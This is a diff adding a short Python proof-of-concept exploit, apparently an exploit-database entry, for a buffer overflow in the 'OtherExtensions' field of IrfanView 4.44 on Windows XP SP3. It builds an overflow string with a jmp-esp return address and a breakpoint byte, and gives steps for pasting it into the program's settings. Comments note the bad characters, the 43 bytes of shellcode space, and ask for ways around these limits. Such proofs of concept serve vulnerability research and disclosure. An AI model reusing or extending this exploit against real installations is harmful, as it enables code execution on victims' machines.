@@ -1,0 +1,30 @@
+# Exploit Title: Irfanview - OtherExtensions Input Overflow
+# Date: 29-04-2017
+# Software Link: http://download.cnet.com/IrfanView/?part=dl-&subj=dl&tag=button
+# Exploit Author: Dreivan Orprecio
+#Version: Irfanview 4.44
+#Irfanview is vulnerable to overflow in "OtherExtensions" input field
+#Debugging Machine: WinXP Pro SP3 (32bit)
+
+
+#POC
+
+#!usr/bin/python
+
+
+      eip = "\xf7\x56\x44\x7e" #jmp esp from user32.dll
+
+
+
+      buffer = "OtherExtensions="+"A" *  199 + eip + "\xcc" 
+
+      print buffer              #a) irfanview->Option->Properties/Settings->Extensions
+                                #b) Paste the buffer in the "other" input then press ok, repeat a) and b)
+
+
+
+
+
+#badcharacters: those instruction that start with 6,7,8,E,F 
+#Only 43 bytes space to host a shellcode and lots of badchars make it hard for this to exploit
+#Any other way around this?
